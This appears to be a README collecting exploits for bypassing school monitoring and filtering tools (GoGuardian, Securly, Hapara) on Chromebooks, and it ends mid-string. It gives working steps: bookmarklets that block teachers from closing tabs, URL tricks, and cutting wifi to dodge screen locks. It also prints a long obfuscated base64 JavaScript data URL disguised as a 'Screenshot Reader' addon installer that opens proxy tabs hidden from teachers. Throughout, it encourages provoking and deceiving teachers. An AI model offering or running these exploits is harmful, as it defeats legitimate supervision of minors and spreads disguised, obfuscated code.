<summary><b>Access Any Website While Browser Is Disabled By GoGuardian</b> Bypass GoGuardian Browsing Disabled</summary>

1. save the site as an app (hit the three dots icon, hover over more tools, hit create shortcut and check the box that says open in window)

2. make ur teacher disable your chromebook (make her/he angry)

3. ur disabled but press the unblocked website app and boom (make sure to move the browsing disabled popup)

</details>

<details>
<summary><b>GGSpam</b> Bypass GoGuardian</summary>

**Bookmark spam exploit for GoGuardian Haven't test on differnet exploits yet.**

### Requiaments:
- Bookmarks enabled
- A working Brain
- Fast Hand

**Instructions**

Step 1: Find the link you want to bypass.

Step 2: Bookmark the link.

Step 3: Spam it until it unblocks

Works on GoGuardian

Extra Info:

If it doesn't work then turn off wifi and spam until you website loads on the search bar then turn on wifi.

</details>

<details>
<summary><b>GoGuardian TabCrash</b> Disables GoGuardian Actions w/TAB LIMIT</summary>

**Teacher's can still see your screen, but they can't block or close any of your tabs.**

**YOUR TEACHER NEEDS TO HAVE SET A TAB LIMIT. TRY OPENING TONS OF TABS TO CONVINCE THEM TO ENABLE TAB LIMITS**.

1. create a bookmark named anything: `javascript: window.onbeforeunload = ()=>{return false;}`

2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of `about:blank` pages.

3. It might ask if you want to leave this page, this is goguardian trying to close it. Say No, and click `Prevent from creating additional dialogues`.

4. Enjoy your unblocked stay!

To undo: close all of your `about:blank` tabs

#### Discovered by @py660

</details>

<details>
<summary><b>GoGuardian TabCrash 2</b> Disables GoGuardian Actions w/TAB LIMIT</summary>

**If your teacher has turned on the tab limit you can bypass this with an extension. If the extension is blocked, sorry.**

Step 1. Download the extension <a href="https://chromewebstore.google.com/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp">Read Aloud: A Text to Speech Voice Reader</a>

Step 2. Use one of your tabs to go to IReady or Scratch. You just need a site that would display the error when you close the tab "Are you sure you want to close this site? Unsaved changes could be lost." 

Step 3. When you have the site with unsaved changes, click the extension until you see the error. Click cancel on the error.

Step 4. The extension should have opened some tabs which say: "Read Aloud uses this tab for audio playback."

Step 5. If you saw the error and clicked cancel, you should have bypassed the tab limit.

</details>

<details>
<summary><b>Insecurly</b> Toggle the Securly extension</summary>

**ONLY FOR SECURLY USERS**

Go to <a href="https://www.disablesecurly.com/">this link</a> and follow instructions

If blocked then go cry in a corner

Credit to <a href="https://www.buymeacoffee.com/bypassi">Bypassi#7037</a> for finding/Making this exploit

</details>

<details>
<summary><b>A Bypass For Securly and a few of other blocker extensions</b> Manipulate any website so securly or any other blocker extension can't block it</summary>

At any URL put #translate.google.com at the end of it or put ?suicidepreventionlifeline.org at the end of it and bam you just unblocked a website by Manipulating the URL

This only works for securly and some other blocker extensions

</details>

<details>
<summary><b>Glitch through securly</b> Unblock any website blocked from securly</summary>

**This only works if your admin/school uses securly. Not sure if this can be blocked or not. So im going to do this step by step**

1. Go to the blocked site you want to access

2. Once it shows the blocked page copy the url it shows

3. Go to the url bar and delete everything between https:// and the first "?"

4. Paste the website url

5. press enter and voila it should be unblocked

6. Have fun

confirmed working with xbox cloud gaming and now.gg

If it doesn't work then go cry.

</details>

<details>  
<summary><b>SOT Exploit</b> Unblock any website or Open any website in a about:blank page</summary>

1. Download this extension <a href="https://chromewebstore.google.com/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall">One Tab</a>

2. Click the import button in the settings tab.

3. Copy-paste the URL you wish to visit about 100 times, and then click import.

4. Spam click the top link, then either spam escape on one of them or wait for one to load on a about:blank page.
  
Credit to <a href="https://github.com/Coding4Hours">Coding4Hours</a>

</details>

<details>
<summary><b>Chaos</b> A full bypass method for Hapara Highlights and Hapara Filter</summary>

**Devtools must not be blocked by policy to perform this exploit.**

Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructions

If blocked then go cry in a corner

</details>

<details>  
<summary><b>Filter session bypass</b> Bypass hapara filter session</summary>

Bookmark this link: <a href="filtersessionbypass.txt">filtersessionbypass.txt</a>

During a filter session, right click the link, and press "Open in a new tab"
Then insert the URL for any website you want to go to.  Make sure to include https://<br>
If it says "website name refused to connect", try using a web proxy.<br>
Also this dosn't bypass blocker extentions so use an unblocked link, or another exploit.

</details>

<details>  
<summary><b>Hapara Lock Screen Bypass</b> Bypass Hapara Lock Screen</summary>

1. Make bookmarks of pages you want to visit beforehand.

2. Once your screen is paused, spam unfullscreen. Each time you do, you should see your tabs and bookmark bar come back. Attempt to right-click on the bookmarks bar until a menu shows up.

3. In the menu, select “Add folder”. Name it whatever you like. Hit Done. With luck, your tabs and bookmarks should stay at the top of your screen. If not, try again.

4. Once the tab and bookmarks bar stays, spam-click one of the bookmarks you made. This lags Hapara into displaying your page instead of the pause page. Turn off your wifi as soon as the page fully loads. This stops data flow between your amd the teacher’s computer, so that they can’t re-pause your screen.

</details>

<details>
<summary><b>Alphabetic</b> Opens unfiltered tabs that are invisible on the teacher dashboard</summary>

### Instructions

1. Right after clicking the bookmark, print the page with Ctrl + P.

2. Click try again on the 404 page.

3. Run the script again.

A proxy tab should open that is not visible on the teacher dashboard.

Heres the bookmark: `data:text/html;javascript:eval(atob('dmFyIEg9eCxUPXg7KGZ1bmN0aW9uKFosdil7dmFyIE89eCxZPXgsZT1aKCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBCPXBhcnNlSW50KE8oMHgxMTQpKS8oLTB4NjdmKjB4MSsweDE5YzcrLTB4MTM0NykqKHBhcnNlSW50KE8oMHhlNykpLygweGIxMistMHg2NSotMHgzNSstMHgxZmY5KSkrcGFyc2VJbnQoWSgweGY4KSkvKC0weDI0OTYrLTB4MWQzNysweDQxZDApKy1wYXJzZUludChZKDB4MTBiKSkvKC0weDExMmIrMHhiZjIrMHg1M2QpKy1wYXJzZUludChPKDB4MTA2KSkvKDB4MWExOCsweGZkMSotMHgxKy0weGE0MikqKC1wYXJzZUludChPKDB4ZjIpKS8oMHgyKi0weGRkNSsweDE1YSotMHgxNisweDM5NmMpKStwYXJzZUludChPKDB4ZTgpKS8oMHgxMTdiKy0weDE0NmUrMHgyZmEpKihwYXJzZUludChZKDB4ZGUpKS8oLTB4YmMwKzB4MiotMHhlOGErMHgyOGRjKSkrLXBhcnNlSW50KFkoMHhlYikpLygweDQ2YyotMHg2KzB4MjA1MSstMHg1YzApKihwYXJzZUludChZKDB4ZTEpKS8oLTB4MTgxYysweDRlOCoweDYrLTB4NTRhKSkrLXBhcnNlSW50KFkoMHhmYykpLygtMHgzZTYqLTB4MSsweDFkMzMrLTB4MjEwZSk7aWYoQj09PXYpYnJlYWs7ZWxzZSBlWydwdXNoJ10oZVsnc2hpZnQnXSgpKTt9Y2F0Y2goRil7ZVsncHVzaCddKGVbJ3NoaWZ0J10oKSk7fX19KEMsMHg4YTYzYysweDg2NjArMHgxMTU5NikpO2Z1bmN0aW9uIHgocCxnKXt2YXIgWj1DKCk7cmV0dXJuIHg9ZnVuY3Rpb24odixlKXt2PXYtKDB4NDJiKi0weDkrMHgyMzExKjB4MSsweDM0ZSk7dmFyIEI9Wlt2XTtyZXR1cm4gQjt9LHgocCxnKTt9dmFyIGc9KGZ1bmN0aW9uKCl7dmFyIFo9ISFbXTtyZXR1cm4gZnVuY3Rpb24odixlKXt2YXIgQj1aP2Z1bmN0aW9uKCl7dmFyIGQ9eDtpZihlKXt2YXIgRj1lW2QoMHhkZCkrJ3knXSh2LGFyZ3VtZW50cyk7cmV0dXJuIGU9bnVsbCxGO319OmZ1bmN0aW9uKCl7fTtyZXR1cm4gWj0hW10sQjt9O30oKSk7KGZ1bmN0aW9uKCl7dmFyIHo9eCxBPXgsdj17fTt2W3ooMHgxMDIpKydZJ109ZnVuY3Rpb24oQixGKXtyZXR1cm4gQitGO30sdltBKDB4ZmYpKyd1J109eigweGVmKSsnbic7dmFyIGU9djtnKHRoaXMsZnVuY3Rpb24oKXt2YXIgRD16LGI9QSxCPW5ldyBSZWdFeHAoRCgweGVlKStEKDB4MTFjKStiKDB4MTE1KStEKDB4MTE4KSksRj1uZXcgUmVnRXhwKEQoMHhlYSkrRCgweGZlKStEKDB4MTE3KStiKDB4MTEyKStiKDB4ZWMpK2IoMHgxMDkpK0QoMHhkYykrYigweGUwKSsnKiknLCdpJyksVT1wKGIoMHhmMSkpOyFCW0QoMHgxMGUpXShlW0QoMHgxMDIpKydZJ10oVSxlW0QoMHhmZikrJ3UnXSkpfHwhRltiKDB4MTBlKV0oVSsoYigweDEwYykrJ3QnKSk/VSgnMCcpOnAoKTt9KSgpO30oKSksd2luZG93W0goMHgxMjEpXShUKDB4MTIzKStIKDB4MTAxKStIKDB4MTA0KStIKDB4MTAzKStUKDB4MTA4KStIKDB4ZTMpK1QoMHgxMTkpK1QoMHgxMDApK1QoMHhlNCkrVCgweDEwZikrSCgweGUyKSkoKTtmdW5jdGlvbiBwKFope3ZhciBKPVQsdz1ILHY9eyd5dnZkZCc6ZnVuY3Rpb24oQixGKXtyZXR1cm4gQj09PUY7fSwnc2pES20nOkooMHhlNSksJ2ZTQ1lIJzp3KDB4MTFlKSt3KDB4MTA3KSt3KDB4MTI2KSwnTWZVUnMnOmZ1bmN0aW9uKEIsRil7cmV0dXJuIEIoRik7fX07ZnVuY3Rpb24gZShCKXt2YXIgYT13LFY9dztpZih2W2EoMHgxMWIpKydkJ10odHlwZW9mIEIsYSgweGZkKSsnbmcnKSlyZXR1cm4gZnVuY3Rpb24oRil7fVthKDB4MTI0KSthKDB4MTIyKStWKDB4ZjMpXShWKDB4MTIwKSthKDB4MTExKStWKDB4MTA1KSthKDB4MTI5KSlbVigweGRkKSsneSddKGEoMHgxMjUpK1YoMHgxMWYpKTtlbHNlKCcnK0IvQilbVigweGY3KSsndGgnXSE9PTB4OGQzKi0weDErMHg2NGQqLTB4MysweDFiYmJ8fEIlKDB4NTIwKy0weDIwNzMrLTB4NTdiKi0weDUpPT09LTB4Y2Q3Ky0weGEwYSoweDErLTB4MSotMHgxNmUxP2Z1bmN0aW9uKCl7cmV0dXJuISFbXTt9W2EoMHgxMjQpK1YoMHgxMjIpK1YoMHhmMyldKGEoMHhlNSkrVigweGY0KSlbYSgweDExMCldKGEoMHhlNikrJ29uJyk6ZnVuY3Rpb24oKXtyZXR1cm4hW107fVthKDB4MTI0KStWKDB4MTIyKStWKDB4ZjMpXSh2W1YoMHhmYSkrJ20nXSthKDB4ZjQpKVthKDB4ZGQpKyd5J10odltWKDB4MTEzKSsnSCddKTtlKCsrQik7fXRyeXtpZihaKXJldHVybiBlO2Vsc2Ugdlt3KDB4ZjYpKydzJ10oZSwweGJmKzB4MSotMHgyNTkrMHgxOWEpO31jYXRjaChCKXt9fWZ1bmN0aW9uIEMoKXt2YXIgaT1bJ3RydWMnLCdodHRwJywnY29ucycsJ2NvdW4nLCdlY3QnLCdydWN0JywndmFsJywnXHgyMHt9JywnLXpBLScsJ2FwcGwnLCcxOTEySUNiUEtQJywnKShceDIwKScsJ1pfJF0nLCczODAxMDEwWmlmTU13JywnWGNRJywnY29tLycsJ2RRdzQnLCdkZWJ1JywnYWN0aScsJzJvQWNKYVQnLCcyNTYxM3ljbmt3RycsJ3t9LmMnLCdceDVjK1x4NWMrJywnOUdPRktBQycsJ18kXVsnLCdzZXRJJywnZnVuYycsJ2NoYWknLCdyblx4MjAoJywnaW5pdCcsJzM2NjA2VUl5cVBZJywndG9yJywnZ2dlcicsJ2hpc1x4MjInLCdNZlVSJywnbGVuZycsJzQ0OTA0Nk5odGVZaicsJygpXHgyMCcsJ3NqREsnLCdudGVyJywnMTQyMzM3NjlOQ1didlonLCdzdHJpJywnXHgyMCooPycsJ2NCc2wnLCdoP3Y9JywnczovLycsJ3JWUWonLCd5b3V0Jywnd3d3LicsJ3J1ZSknLCc2ODBTQnpjVlAnLCdlT2JqJywndWJlLicsJzAtOWEnLCdvbnN0JywnMjAzNzYwd0lFQUNvJywnaW5wdScsJ3JldHUnLCd0ZXN0JywndzlXZycsJ2NhbGwnLCdlXHgyMCh0JywnekEtWicsJ2ZTQ1knLCc1NDM0MDdUUXhDcXgnLCdceDIwKlx4NWMoJywnd0hyeCcsJzpbYS0nLCdceDIwKlx4NWMpJywnd2F0YycsJ3JuXHgyMHQnLCd5dnZkJywndGlvbicsJ29yKFx4MjInLCdzdGF0JywndGVyJywnd2hpbCcsJ29wZW4nXTtDPWZ1bmN0aW9uKCl7cmV0dXJuIGk7fTtyZXR1cm4gQygpO30oZnVuY3Rpb24oKXt2YXIgeT1ULHM9VCx2PXt9O3ZbeSgweDExNikrJ24nXT1zKDB4MTBkKSt5KDB4ZjApK3MoMHhlZSkrcygweDExYykrcygweGY5KTt2YXIgZT12LEI9ZnVuY3Rpb24oKXt2YXIgbT15LEc9cyxVO3RyeXtVPUZ1bmN0aW9uKGVbbSgweDExNikrJ24nXSsoRygweGU5KSttKDB4MTBhKStHKDB4MTI3KStHKDB4MTFkKStHKDB4MTBkKSttKDB4MTFhKSttKDB4ZjUpK20oMHhkZikpKycpOycpKCk7fWNhdGNoKFgpe1U9d2luZG93O31yZXR1cm4gVTt9LEY9QigpO0ZbeSgweGVkKSt5KDB4ZmIpK3koMHgxMjgpXShwLC0weDZmMSoweDErLTB4MWMxKjB4ZCsweDFlODYpO30oKSk7')),%3Ctitle%3EScreenshot%20Reader%3C%2Ftitle%3E%3Ch1%3EAddon%20Installer%20for%20Screenshot%20Reader%3C%2Fh1%3E%3Cp%3EPlease%20allow%20%3Cb%3EJavaScript%20URLs%3C%2Fb%3E%20to%20continue%3C%2Fp%3E%3Cbr%3E%3Csmall%3EPress%20Control%2BP%20to%20print%20this%20page%3C%2Fsmall%3E%3Cscript%3E%28function%28K%2Co%29%7Bconst%20F%3DK%28%29%3Bfunction%20T%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20w%28F-%20-0x31c%2CR%29%3B%7Dwhile%28%21%21%5B%5D%29%7Btry%7Bconst%20v%3D-parseInt%28T%28-0x189%2C-0x199%2C-0x17d%2C-0x168%2C-0x181%2C-0x195%2C%27aUk6%27%29%29/%28-0x345*0xa+0x43*-0x7+0x2288%29*%28-parseInt%28T%28-0x138%2C-0x12d%2C-0x142%2C-0x141%2C-0x14b%2C-0x13d%2C%27T09K%27%29%29/%28-0xae*-0x20+-0x4f8+-0x10c6%29%29+parseInt%28T%28-0x149%2C-0x13f%2C-0x13f%2C-0x143%2C-0x167%2C-0x165%2C%27Cr%5BR%27%29%29/%280x9cd*-0x3+0xb5*0x22+-0x8*-0xac%29*%28-parseInt%28T%28-0x13e%2C-0x13a%2C-0x158%2C-0x149%2C-0x170%2C-0x14e%2C%27iKyB%27%29%29/%28-0x1*-0x1afb+0x1bac+-0x36a3%29%29+-parseInt%28T%28-0x17d%2C-0x169%2C-0x166%2C-0x185%2C-0x147%2C-0x178%2C%27oEsR%27%29%29/%280x7e9+-0x1*-0x24ed+-0x2cd1*0x1%29+-parseInt%28T%28-0x161%2C-0x172%2C-0x14d%2C-0x15c%2C-0x14e%2C-0x132%2C%27JQEt%27%29%29/%280x19fd+0x107d+-0xd1*0x34%29+parseInt%28T%28-0x144%2C-0x180%2C-0x163%2C-0x15d%2C-0x186%2C-0x14f%2C%27DVnL%27%29%29/%280x9b5+0x267+0xc15*-0x1%29+parseInt%28T%28-0x137%2C-0x15e%2C-0x152%2C-0x13e%2C-0x147%2C-0x176%2C%27ltzn%27%29%29/%280x8c1+0x5ce+-0xe87*0x1%29+parseInt%28T%28-0x17e%2C-0x144%2C-0x15c%2C-0x16f%2C-0x17f%2C-0x152%2C%27Y%5B%25s%27%29%29/%280x1d0a+0x9ad*-0x4+0x9b3%29*%28parseInt%28T%28-0x12e%2C-0x122%2C-0x13d%2C-0x11d%2C-0x128%2C-0x132%2C%27iKyB%27%29%29/%280xeda*0x2+0x5d0+-0x237a%29%29%3Bif%28v%3D%3D%3Do%29break%3Belse%20F%5B%27push%27%5D%28F%5B%27shift%27%5D%28%29%29%3B%7Dcatch%28H%29%7BF%5B%27push%27%5D%28F%5B%27shift%27%5D%28%29%29%3B%7D%7D%7D%28Q%2C-0x11a87*0xd+0x9d9c5+-0x10aa6*-0xf%29%29%3Bfunction%20w%28C%2Ca%29%7Bconst%20K%3DQ%28%29%3Breturn%20w%3Dfunction%28G%2Cg%29%7BG%3DG-%28-0x2357+0x1591*-0x1+0x3a78%29%3Blet%20o%3DK%5BG%5D%3Bif%28w%5B%27nOjZNt%27%5D%3D%3D%3Dundefined%29%7Bvar%20F%3Dfunction%28A%29%7Bconst%20T%3D%27abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/%3D%27%3Blet%20l%3D%27%27%2CN%3D%27%27%2Cj%3Dl+F%3Bfor%28let%20i%3D0xa4d+0x382+0x5*-0x2c3%2CW%2Ch%2Cs%3D0x10fd*-0x1+-0x1f*-0x6a+0x427*0x1%3Bh%3DA%5B%27charAt%27%5D%28s++%29%3B%7Eh%26%26%28W%3Di%25%280x190d+-0x15c8*0x1+0x31*-0x11%29%3FW*%28-0xb*0x143+0x24e8+0x11*-0x157%29+h%3Ah%2Ci++%25%280x1*0xf1d+-0x2500+0x15e7%29%29%3Fl+%3Dj%5B%27charCodeAt%27%5D%28s+%28-0xa8a+0x3*0xc4d+-0x1a53%29%29-%280x22e5+0x2330+0x1a1*-0x2b%29%21%3D%3D0x2de*-0x7+0x1185+-0x1*-0x28d%3FString%5B%27fromCharCode%27%5D%28-0x4*0x95c+0x1e7f+-0x10*-0x7f%26W%3E%3E%28-%280x1007*0x1+0x1fe1+-0x2fe6%29*i%26-0x3d*-0x6b+-0x16c4+-0x2b5%29%29%3Ai%3A-0xa6*0x3b+-0x1182+0x37c4%29%7Bh%3DT%5B%27indexOf%27%5D%28h%29%3B%7Dfor%28let%20D%3D0x11d*-0x1+-0x9d*0x1+-0x22*-0xd%2Cq%3Dl%5B%27length%27%5D%3BD%3Cq%3BD++%29%7BN+%3D%27%25%27+%28%2700%27+l%5B%27charCodeAt%27%5D%28D%29%5B%27toString%27%5D%28-0x210a+0x1459+0xcc1*0x1%29%29%5B%27slice%27%5D%28-%28-0x793+-0x1*-0xd91+-0x5fc*0x1%29%29%3B%7Dreturn%20decodeURIComponent%28N%29%3B%7D%3Bconst%20R%3Dfunction%28A%2CT%29%7Blet%20l%3D%5B%5D%2CN%3D0x1*0x1145+-0x93a*0x4+0x13a3%2CW%2Ch%3D%27%27%3BA%3DF%28A%29%3Blet%20D%3Bfor%28D%3D0x1*-0x1e83+0x1*0x2627+-0x146*0x6%3BD%3C-0xf92*0x2+0x532+-0x1af2*-0x1%3BD++%29%7Bl%5BD%5D%3DD%3B%7Dfor%28D%3D0x1*0x1edd+-0x5a9*0x1+0x2*-0xc9a%3BD%3C0x23ff+0xad*-0x20+0x1e9*-0x7%3BD++%29%7BN%3D%28N+l%5BD%5D+T%5B%27charCodeAt%27%5D%28D%25T%5B%27length%27%5D%29%29%25%28-0x13e*0x1f+0x1033+0x174f%29%2CW%3Dl%5BD%5D%2Cl%5BD%5D%3Dl%5BN%5D%2Cl%5BN%5D%3DW%3B%7DD%3D-0x1baf+-0x12e8+-0x1*-0x2e97%2CN%3D0x1*0x1883+0x1141+0x63*-0x6c%3Bfor%28let%20q%3D-0x11b*0x1d+-0x3*-0x8ac+0x11*0x5b%3Bq%3CA%5B%27length%27%5D%3Bq++%29%7BD%3D%28D+%280xd35+-0x1764+0x10*0xa3%29%29%25%280x132d*0x2+-0x16da+-0xe80%29%2CN%3D%28N+l%5BD%5D%29%25%280x1*-0xf91+-0x175*0x12+0x88f*0x5%29%2CW%3Dl%5BD%5D%2Cl%5BD%5D%3Dl%5BN%5D%2Cl%5BN%5D%3DW%2Ch+%3DString%5B%27fromCharCode%27%5D%28A%5B%27charCodeAt%27%5D%28q%29%5El%5B%28l%5BD%5D+l%5BN%5D%29%25%28-0x5*0x34c+-0x1*0xaf1+0x1c6d%29%5D%29%3B%7Dreturn%20h%3B%7D%3Bw%5B%27vJpagG%27%5D%3DR%2CC%3Darguments%2Cw%5B%27nOjZNt%27%5D%3D%21%21%5B%5D%3B%7Dconst%20v%3DK%5B-0x166d+0x186e+0x9*-0x39%5D%2CH%3DG+v%2CY%3DC%5BH%5D%3Bif%28%21Y%29%7Bif%28w%5B%27paiGzb%27%5D%3D%3D%3Dundefined%29%7Bconst%20A%3Dfunction%28T%29%7Bthis%5B%27tHPCMF%27%5D%3DT%2Cthis%5B%27zhZNab%27%5D%3D%5B-0x39*-0x31+-0x220a+0x1722%2C0x25aa*0x1+-0x54e*0x1+-0x205c*0x1%2C-0x5ae+-0x25*-0x6+-0x4d*-0x10%5D%2Cthis%5B%27DHhDxH%27%5D%3Dfunction%28%29%7Breturn%27newState%27%3B%7D%2Cthis%5B%27RiaToM%27%5D%3D%27%5Cx5cw+%5Cx20*%5Cx5c%28%5Cx5c%29%5Cx20*%7B%5Cx5cw+%5Cx20*%27%2Cthis%5B%27ROcrsb%27%5D%3D%27%5B%5Cx27%7C%5Cx22%5D.+%5B%5Cx27%7C%5Cx22%5D%3B%3F%5Cx20*%7D%27%3B%7D%3BA%5B%27prototype%27%5D%5B%27NpNvWy%27%5D%3Dfunction%28%29%7Bconst%20T%3Dnew%20RegExp%28this%5B%27RiaToM%27%5D+this%5B%27ROcrsb%27%5D%29%2Cl%3DT%5B%27test%27%5D%28this%5B%27DHhDxH%27%5D%5B%27toString%27%5D%28%29%29%3F--this%5B%27zhZNab%27%5D%5B0xc79+0xe71+-0x1ae9%5D%3A--this%5B%27zhZNab%27%5D%5B-0x3*-0x6a1+-0xc47*0x3+0x9*0x1e2%5D%3Breturn%20this%5B%27nmCwWY%27%5D%28l%29%3B%7D%2CA%5B%27prototype%27%5D%5B%27nmCwWY%27%5D%3Dfunction%28T%29%7Bif%28%21Boolean%28%7ET%29%29return%20T%3Breturn%20this%5B%27JWAvRD%27%5D%28this%5B%27tHPCMF%27%5D%29%3B%7D%2CA%5B%27prototype%27%5D%5B%27JWAvRD%27%5D%3Dfunction%28T%29%7Bfor%28let%20l%3D0xa0+0x1*-0xf7+0x1*0x57%2CN%3Dthis%5B%27zhZNab%27%5D%5B%27length%27%5D%3Bl%3CN%3Bl++%29%7Bthis%5B%27zhZNab%27%5D%5B%27push%27%5D%28Math%5B%27round%27%5D%28Math%5B%27random%27%5D%28%29%29%29%2CN%3Dthis%5B%27zhZNab%27%5D%5B%27length%27%5D%3B%7Dreturn%20T%28this%5B%27zhZNab%27%5D%5B-0x520+-0xc43+-0x1163*-0x1%5D%29%3B%7D%2Cnew%20A%28w%29%5B%27NpNvWy%27%5D%28%29%2Cw%5B%27paiGzb%27%5D%3D%21%21%5B%5D%3B%7Do%3Dw%5B%27vJpagG%27%5D%28o%2Cg%29%2CC%5BH%5D%3Do%3B%7Delse%20o%3DY%3Breturn%20o%3B%7D%2Cw%28C%2Ca%29%3B%7Dconst%20G%3D%28function%28%29%7Blet%20K%3D%21%21%5B%5D%3Breturn%20function%28o%2CF%29%7Bconst%20v%3DK%3Ffunction%28%29%7Bfunction%20l%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20w%28F-%20-0xe6%2CY%29%3B%7Dif%28F%29%7Bconst%20H%3DF%5Bl%280xe5%2C0xe1%2C0xbf%2C0xe1%2C0xe5%2C%27VT@u%27%2C0xbf%29%5D%28o%2Carguments%29%3Breturn%20F%3Dnull%2CH%3B%7D%7D%3Afunction%28%29%7B%7D%3Breturn%20K%3D%21%5B%5D%2Cv%3B%7D%3B%7D%28%29%29%2Cg%3DG%28this%2Cfunction%28%29%7Bconst%20o%3D%7B%7D%3Bfunction%20N%28K%2Co%2CF%2Cv%2CH%2CY%2CR%29%7Breturn%20w%28F-0x380%2CR%29%3B%7Do%5BN%280x527%2C0x51a%2C0x53a%2C0x55a%2C0x53c%2C0x550%2C%27E3LE%27%29%5D%3DN%280x543%2C0x562%2C0x54e%2C0x52e%2C0x55e%2C0x527%2C%27W4jq%27%29+N%280x520%2C0x550%2C0x52e%2C0x540%2C0x539%2C0x523%2C%27r%23v%25%27%29%3Bconst%20F%3Do%3Breturn%20g%5BN%280x568%2C0x565%2C0x560%2C0x563%2C0x56b%2C0x569%2C%27ltzn%27%29+%27g%27%5D%28%29%5BN%280x4fb%2C0x534%2C0x51d%2C0x4f9%2C0x514%2C0x526%2C%273GLD%27%29%5D%28F%5BN%280x556%2C0x549%2C0x549%2C0x54b%2C0x55d%2C0x521%2C%27T09K%27%29%5D%29%5BN%280x544%2C0x550%2C0x551%2C0x53f%2C0x545%2C0x57a%2C%27R%24s0%27%29+%27g%27%5D%28%29%5BN%280x523%2C0x52c%2C0x523%2C0x546%2C0x512%2C0x54b%2C%27oarp%27%29+%27ctor%27%5D%28g%29%5BN%280x50b%2C0x505%2C0x529%2C0x510%2C0x50f%2C0x507%2C%27JQEt%27%29%5D%28F%5B%27XnmWR%27%5D%29%3B%7D%29%3Bfunction%20Q%28%29%7Bconst%20s%3D%5B%27dM/cG8kserCP%27%2C%27emoVD8oUrCodW7m%27%2C%27fWz5cJbIWOq%27%2C%27CZZcKCkxeW%27%2C%27W7lcHKioya%27%2C%27amkXBcHcys8%27%2C%27kSk/BCoKWQrr%27%2C%27W4HkW6FdG8kGkCkH%27%2C%27gtWGW7xdHXu%27%2C%27WP0zW4X4pCoHxa%27%2C%27WRVcJCoubmkgkmkm%27%2C%27b8kjW5HDW7H5fr0%27%2C%27W5zgW6ldISkZkCkN%27%2C%27w8kRoCocFq%27%2C%27W5TxW7ddJ8k8z8oO%27%2C%27sCkdEGjpBxy%27%2C%27pZPPwW%27%2C%27W6ldIW4ZW73dGCkx%27%2C%27WO0oWQ8pdCklaG%27%2C%27BNK2aeZdMmkB%27%2C%27eLVdU8oYWPq%27%2C%27zmoqWRCnxmo/E2XfW5ZdGJpdQW%27%2C%27W6/cVKa5whVdOq%27%2C%27AmoabCkIW7pdSre%27%2C%27tmoHmSkWW7mrb8o5WOdcJCojW54%27%2C%27DchcMCkSjW%27%2C%27zSosWRqixSkzifHlW7tdVa%27%2C%27WRnlCrpdVq%27%2C%27wahcH1bdW4FdMa%27%2C%27tWW8z8kBj8k0pSkodSk1W7vw%27%2C%27W6JcTbT7ta%27%2C%27geiIFdZcJ1C%27%2C%27mmkUW6j1la%27%2C%27W514WP9DWQBdV3K%27%2C%27jSoxjCkDW5C%27%2C%27WQRcG8oAemkveSkoW47cRSok%27%2C%27WQqeWP44cW%27%2C%27W6a0WOfhW4KrhW%27%2C%27db04etb9WP0%27%2C%27fCofng0FmYnGr8ouCMWh%27%2C%27wwZcNupcLq%27%2C%27WRfQW4DzWP9tqMRcGCohCZZdPW%27%2C%27W5hcIxWzpSoGWQNdTmkZW4G%27%2C%27W6JcUraGaW4G%27%2C%27W6dcJaH8W63dICkm%27%2C%27gf3dMW4BW5tdNa%27%2C%27w2X2WRxcKe/dMmkRevldMCkk%27%2C%27fhddUCkFoSk6eq%27%2C%27WP3dLHXAhCo/WQO%27%2C%27kHtdRuCmWOBcHq%27%2C%27W6NcRmowW6a5sW4%27%2C%27W7FdLSoidConBSkr%27%2C%27W70NW7S7pSkCW48%27%2C%27W4BcHmogsmkyqfy%27%2C%27WRvUW4fBWPjtgg/cJSouyZG%27%2C%27DM7cMdtdQSobdG%27%2C%27eG9noWu%27%2C%27mdBcPMdcJ8kvW7BdGq%27%2C%27WRNcOCoE%27%2C%27wLT/nSopCmoU%27%2C%27pYVdJNhdGSoKbHTzWRm%27%2C%27qgWIxXG%27%2C%27WQRcHCoyeSofC8otWO/cISotqvxdK2y%27%2C%27W7a0WQuDW5qifa%27%2C%27WQxcU1eUtwZdQW%27%2C%27rSoRubu+eq%27%2C%27W4NcNfabyW%27%2C%27WR4JEcScpti%27%2C%27CMpcL3e%27%2C%27mJLOrqJdH8oB%27%2C%27ghCXW6BdGXJdIq%27%2C%27DWtcOMXQ%27%2C%27W4VcMCogvmou%27%2C%27WPNdLmkCeCoffbi%27%2C%27WRXrB8o5WQvZWRO%27%2C%27amoGqWa7f8kU%27%2C%27bhJcP8k6qe5r%27%2C%27W5RcK8odx8kjfq%27%2C%27WQa0W7DYESkCW5G%27%2C%27W7zJWQz6y8kPWPRdTSkYW5xdKG%27%2C%27nZ5HwrlcMmoP%27%5D%3BQ%3Dfunction%28%29%7Breturn%20s%3B%7D%3Breturn%20Q%28%29%3B%7Dg%28%29%2C%28%28%28%29%3D%3E%7Bconst%20K%3D%7B%27Zjbcz%27%3Aj%28%27W4jq%27%2C0x2af%2C0x2a9%2C0x2a8%2C0x2ae%2C0x2bc%2C0x2a8%29+j%28%27%28l%5Dd%27%2C0x2aa%2C0x2a1%2C0x286%2C0x28b%2C0x27c%2C0x275%29+j%28%27E%5Dql%27%2C0x291%2C0x29d%2C0x298%2C0x2a1%2C0x2bd%2C0x277%29+j%28%27JQEt%27%2C0x267%2C0x260%2C0x281%2C0x272%2C0x291%2C0x25f%29+j%28%27z%5BQ4%27%2C0x290%2C0x265%2C0x27b%2C0x25e%2C0x29f%2C0x259%29+%27nnectiv%27+j%28%275DGf%27%2C0x276%2C0x2ba%2C0x29b%2C0x298%2C0x291%2C0x277%29+j%28%27z%5BQ4%27%2C0x2b6%2C0x2bb%2C0x2aa%2C0x2ad%2C0x2a5%2C0x2b1%29%2C%27PaUhe%27%3A%27about%3Ab%27+j%28%27CbbX%27%2C0x27e%2C0x27c%2C0x2a0%2C0x284%2C0x2ae%2C0x29f%29%2C%27EYuJk%27%3Afunction%28F%2Cv%29%7Breturn%20F+v%3B%7D%2C%27aLbHC%27%3Afunction%28F%2Cv%29%7Breturn%20F%28v%29%3B%7D%2C%27ffZBA%27%3A%27%3Cscript%27+%27%3Ewindow%27+%2